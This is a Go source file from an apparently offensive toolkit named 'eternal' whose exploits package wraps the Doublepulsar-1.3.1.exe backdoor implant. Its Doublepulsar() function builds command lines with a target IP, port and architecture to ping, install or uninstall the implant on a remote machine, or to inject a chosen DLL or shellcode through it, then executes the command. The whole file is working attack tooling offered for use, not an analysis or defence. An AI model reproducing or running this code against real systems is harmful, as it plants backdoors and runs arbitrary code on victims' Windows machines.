package exploits

import (
	"eternal/conf"
	"eternal/metatdatas"
	"eternal/utils"
	"os/exec"
	"path/filepath"
)

func Doublepulsar() {
	var cmd *exec.Cmd
	metatdatas.MetaData.SetFunction()
	switch metatdatas.MetaData.Function {
	case "OutputInstall":
		metatdatas.MetaData.SetOutputInstall()
		metatdatas.MetaData.SetArch()
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--Architecture", metatdatas.MetaData.Arch, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--OutputFile", metatdatas.MetaData.OutputInstall)
	case "Ping":
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function)
	case "RunDLL":
		metatdatas.MetaData.SetDLLPath()
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--DllPayload", metatdatas.MetaData.DLLPath)
	case "RunShellcode":
		metatdatas.MetaData.SetDLLPath()
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--ShellcodeFile", metatdatas.MetaData.DLLPath, "--ShellcodeData", metatdatas.MetaData.ShellcodeBuffer)
	case "Uninstall":
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function)
	}
	utils.Execute(cmd)
}
